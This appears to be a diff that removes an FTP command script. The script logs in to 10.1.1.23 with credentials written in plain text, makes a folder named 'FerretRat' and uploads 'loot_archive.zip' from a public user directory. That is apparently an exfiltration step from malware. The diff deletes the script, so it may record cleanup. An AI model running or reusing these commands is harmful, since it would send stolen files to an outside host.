@@ -1,8 +1,0 @@
-open 10.1.1.23
-sftp_user
-Tester@123
-mkdir FerretRat
-cd FerretRat
-binary
-put C:\Users\Public\loot_archive.zip
-bye
